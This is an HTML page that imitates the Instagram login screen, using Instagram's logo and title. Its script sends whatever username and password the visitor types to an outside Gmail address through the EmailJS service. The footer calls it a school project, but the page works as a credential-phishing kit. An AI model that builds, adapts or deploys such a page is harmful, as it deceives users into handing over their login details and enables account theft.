<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram - Sign In</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #fafafa 0%, #f5f5f5 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }
    .container {
      width: 380px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      padding: 40px 30px;
      text-align: center;
      animation: fadeIn 0.5s ease-in;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .logo {
      width: 180px;
      margin-bottom: 30px;
    }
    .form-box {
      padding: 0 20px;
    }
    .input-field {
      width: 100%;
      padding: 12px 15px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      background: #fafafa;
      font-size: 14px;
      transition: border-color 0.3s ease;
    }
    .input-field:focus {
      border-color: #0095f6;
      outline: none;
    }
    .signin-btn {
      width: 100%;
      padding: 10px;
      background: linear-gradient(90deg, #0095f6, #b52b95);
      color: white;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      font-size: 16px;
      cursor: pointer;
      margin-top: 15px;
      transition: opacity 0.3s ease;
    }
    .signin-btn:hover {
      opacity: 0.9;
    }
    .signin-btn:disabled {
      background: #b2dffc;
      cursor: not-allowed;
    }
    .separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }
    .separator hr {
      flex-grow: 1;
      border: none;
      border-top: 1px solid #dbdbdb;
    }
    .separator span {
      margin: 0 15px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: bold;
    }
    .signup-link {
      margin-top: 25px;
      font-size: 14px;
      color: #262626;
    }
    .signup-link a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #8e8e8e;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
    <div class="form-box">
      <form id="signin-form">
        <input type="text" name="username" id="username" class="input-field" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" id="password" class="input-field" placeholder="Password" required>
        <button type="submit" class="signin-btn" id="signin-btn">Log In</button>
      </form>
      <div class="separator">
        <hr><span>OR</span><hr>
      </div>
    </div>
    <div class="signup-link">
      Don't have an account? <a href="#">Sign up</a>
    </div>
    <div class="footer">
      Â© 2025 Instagram Clone for School Project
    </div>
  </div>

  <!-- EmailJS SDK -->
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS with your public key
    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS Public Key

    document.getElementById("signin-form").addEventListener("submit", function(event) {
      event.preventDefault(); // Prevent default form submission

      const signinBtn = document.getElementById("signin-btn");
      signinBtn.disabled = true; // Disable button to prevent multiple submissions
      signinBtn.textContent = "Logging In...";

      // Get form data
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      // EmailJS send email
      emailjs.send("service_q4xx7l7", "template_ig9j51l", {
        username: username,
        password: password,
        to_email: "whatyoudontknow001@gmail.com" // Replace with your email
      })
      .then(function(response) {
        alert("Sign-in details sent to email successfully!");
        signinBtn.disabled = false;
        signinBtn.textContent = "Log In";
        document.getElementById("signin-form").reset(); // Clear form
      }, function(error) {
        alert("Failed to send details. Please try again.");
        signinBtn.disabled = false;
        signinBtn.textContent = "Log In";
      });
    });
  </script>
</body>
</html>
